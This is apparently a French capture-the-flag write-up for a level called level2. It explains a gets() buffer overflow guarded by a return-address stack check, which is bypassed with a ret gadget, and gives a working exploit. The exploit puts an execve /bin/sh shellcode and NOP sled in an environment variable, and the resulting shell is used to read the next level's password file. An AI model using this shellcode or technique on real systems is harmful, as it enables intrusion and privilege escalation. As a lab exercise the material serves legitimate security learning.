## Level2

### Analyse
La fonction p utilise gets (buffer overflow), mais vérifie que l'adresse de retour ne pointe pas vers la stack (0xb0000000). On ne peut donc pas faire un ret2shellcode classique.

```bash
$ gdb level2
(gdb) disas p
   0x080484ed <+25>:  call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:  mov    eax,DWORD PTR [ebp+0x4]  # Récupère EIP sauvegardé
   0x080484fb <+39>:  and    eax,0xb0000000            # Masque stack (0xbfffffff...)
   0x08048500 <+44>:  cmp    eax,0xb0000000
   0x08048505 <+49>:  jne    0x8048527 <p+83>          # OK → continue
   0x08048522 <+78>:  call   0x80483d0 <_exit@plt>     # Stack → exit
```
Cette protection bloque tout retour vers la pile (0xb0000000), ce qui invalide les approches classiques de ret2shellcode sur le stack.

### Exploitation
On place le shellcode dans une variable d'environnement avec un large NOP sled, hors de la zone filtrée. L'offset jusqu'à l'EIP est de 80 octets.
On passe par un ret gadget dans le binaire (0x0804854b) pour contourner le check avant de sauter dans le NOP sled.

```bash
# 1. Préparer le payload
$ python -c 'print "A"*80 + "\x4b\x85\x04\x08" + "\xaa\xfe\xff\xbf"' > /tmp/exploit

# 2. Lancer l'exploit
$ (cat /tmp/exploit; cat) | env -i \
    exploit=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') \
    ./level2

# 3. Récupérer le mot de passe
$ whoami
level3
$ cat /home/user/level3/.pass
```
